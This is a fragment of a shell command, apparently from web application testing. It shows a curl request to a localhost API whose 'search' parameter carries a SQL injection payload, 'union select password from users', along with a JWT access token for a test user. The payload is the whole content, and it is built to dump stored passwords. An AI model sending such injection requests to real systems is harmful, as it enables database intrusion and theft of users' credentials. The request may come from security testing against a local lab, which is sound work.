curl -k 'https://localhost:2443/api/me?search=1%20union%20select%20password%20from%20users' \
  ...
  -H 'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicG9sb0B0ZXN0LmNvbSIsIm5hbWUiOiJwb2xvIiwiaWF0IjoxNzUzMzU2MzUzfQ.LQpk93kWnbOnKdHotR3tY1XOp4bnShsDKCI7jreNNCs' \
